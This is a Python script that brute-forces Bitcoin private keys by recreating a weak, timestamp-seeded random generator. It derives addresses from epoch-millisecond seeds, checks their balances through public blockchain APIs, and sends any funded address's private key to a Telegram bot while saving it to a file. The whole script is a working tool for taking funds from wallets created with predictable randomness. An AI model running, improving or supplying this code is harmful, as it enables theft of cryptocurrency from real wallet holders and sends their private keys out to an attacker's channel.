import random
import time
import coincurve
import hashlib
import base58
import asyncio
from aiohttp import ClientSession, ClientTimeout
from dotenv import load_dotenv
import os

load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

# Load proxies
with open('proxies.txt', 'r') as f:
    PROXY_LIST = [l.strip() for l in f if l.strip()]

SAVE_PROGRESS_INTERVAL = 600
BATCH_SIZE = 10000

async def send_telegram_message(session: ClientSession, message: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        async with session.post(url, data=payload) as resp:
            return await resp.json()
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

class SecureRandom:
    def __init__(self, seed):
        self.pool = []
        self.ptr = 0
        random.seed(seed)
        for _ in range(32):
            self.pool.append(random.randint(0,255))
    def rng_get_byte(self):
        if self.ptr >= len(self.pool):
            self.ptr = 0
            self.pool = [random.randint(0,255) for _ in range(32)]
        b = self.pool[self.ptr]
        self.ptr += 1
        return b
    def rng_get_bytes(self, n):
        return bytes(self.rng_get_byte() for _ in range(n))

def custom_private_key_generator(seed):
    rng = SecureRandom(seed)
    return rng.rng_get_bytes(32).hex()

def generate_compressed_P2PKH_address(private_key):
    pk = bytes.fromhex(private_key)
    obj = coincurve.PrivateKey(pk)
    pub = obj.public_key.format(compressed=True)
    h = hashlib.new('ripemd160', hashlib.sha256(pub).digest()).hexdigest()
    ext = '00' + h
    chk = hashlib.sha256(hashlib.sha256(bytes.fromhex(ext)).digest()).hexdigest()[:8]
    return base58.b58encode(bytes.fromhex(ext + chk)).decode()

async def check_balance(session: ClientSession, address: str):
    apis = [
        f"https://blockstream.info/api/address/{address}",
        f"https://mempool.space/api/address/{address}",
        f"https://blockchain.info/rawaddr/{address}"
    ]
    for url in apis:
        try:
            async with session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    funded = data.get('chain_stats',{}).get('funded_txo_sum',0)
                    spent  = data.get('chain_stats',{}).get('spent_txo_sum',0)
                    return (funded - spent) / 1e8
        except:
            continue
    return 0

async def mass_check_balance():
    timeout = ClientTimeout(total=10)
    async with ClientSession(timeout=timeout) as session:
        with open('generated_wallet.txt','r') as f:
            lines = f.readlines()
        total = len(lines)
        print(f"Starting balance check for {total} wallets")
        for idx, line in enumerate(lines, 1):
            parts = line.strip().split(',', 1)
            if len(parts) != 2:
                print(f"Skipping invalid line: {line.strip()}")
                continue
            priv, addr = parts
            bal = await check_balance(session, addr)
            if bal > 0:
                msg = f"FOUND WALLET\nAddress: {addr}\nBalance: {bal} BTC\nPrivate Key: {priv}"
                await send_telegram_message(session, msg)
                with open('funded_wallet.txt','a') as wf:
                    wf.write(f"Address: {addr} | Balance: {bal} BTC | Private Key: {priv}\n")
            # update every wallet
            print(f"Checked balances: {idx}/{total}", end='\r', flush=True)
        print()  # newline
        print(f"Completed balance check for {total} wallets")

def save_progress(seed):
    with open('progress.txt','w') as f:
        f.write(str(seed))

def load_progress():
    try:
        return int(open('progress.txt').read().strip())
    except:
        return None

async def generate_and_check_wallets():
    seed = load_progress() or int(input("Masukkan seed mulai (epoch ms): "))
    curr = seed
    print(f"\nStarting generation of {BATCH_SIZE} wallets from seed {curr}")
    while True:
        with open('generated_wallet.txt','w') as f:
            for i in range(1, BATCH_SIZE+1):
                pk = custom_private_key_generator(curr)
                addr = generate_compressed_P2PKH_address(pk)
                f.write(f"{pk},{addr}\n")
                curr += 1
                # update every wallet
                print(f"Generated wallets: {i}/{BATCH_SIZE}", end='\r', flush=True)
        print()  # newline
        print(f"Completed generation of {BATCH_SIZE} wallets. Next seed: {curr}")
        await mass_check_balance()
        os.remove('generated_wallet.txt')
        save_progress(curr)

if __name__ == '__main__':
    print("Starting Wallet Generator and Mass Balance Checker\n")
    asyncio.run(generate_and_check_wallets())
